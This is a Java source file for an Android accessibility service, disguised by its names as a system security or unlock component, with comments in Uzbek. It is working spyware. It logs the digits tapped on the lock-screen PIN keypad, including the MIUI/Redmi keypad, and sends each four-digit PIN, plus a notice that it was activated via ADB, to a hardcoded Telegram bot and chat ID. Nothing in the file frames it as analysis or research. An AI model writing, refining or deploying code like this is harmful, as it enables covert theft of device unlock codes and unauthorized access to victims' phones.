package com.system.security;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class UnlockService extends AccessibilityService {

    private StringBuilder pinBuffer = new StringBuilder();
    private long lastClickTime = 0;
    private static final String BOT_TOKEN = "8641599033:AAFqD1brrN4CGQebEFnnCNFire5f3xsDep4";
    private static final String CHAT_ID = "8572227182";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        sendData("Tizim_ADB_orqali_faollashtirildi!_PIN_kutilmoqda...");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();

        // 1. Agar ekran o'chib yongan bo'lsa, eski qoldiqlarni tozalash
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            pinBuffer.setLength(0);
        }

        // 2. Faqat haqiqiy CLICK va FOCUSED hodisalarini ushlash
        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED || eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            long currentTime = System.currentTimeMillis();
            if (currentTime - lastClickTime < 300) return; // Juda tez-tez bosishdan himoya

            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                String digit = findDigit(source);
                if (digit != null) {
                    pinBuffer.append(digit);
                    lastClickTime = currentTime;
                    
                    if (pinBuffer.length() == 4) {
                        sendData("MIUI_PIN_FOUND: " + pinBuffer.toString());
                        pinBuffer.setLength(0); 
                    }
                }
                source.recycle();
            }
        }
    }

    private String findDigit(AccessibilityNodeInfo node) {
        if (node == null) return null;
        
        // Redmi klaviaturasi ba'zan 'text' o'rniga 'contentDescription' ishlatadi
        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();
        
        String val = null;
        if (text != null && text.length() == 1 && Character.isDigit(text.charAt(0))) {
            val = text.toString();
        } else if (desc != null && desc.length() == 1 && Character.isDigit(desc.charAt(0))) {
            val = desc.toString();
        }
        
        return val;
    }

    private void sendData(final String msg) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.getInputStream().close();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override public void onInterrupt() {}
}
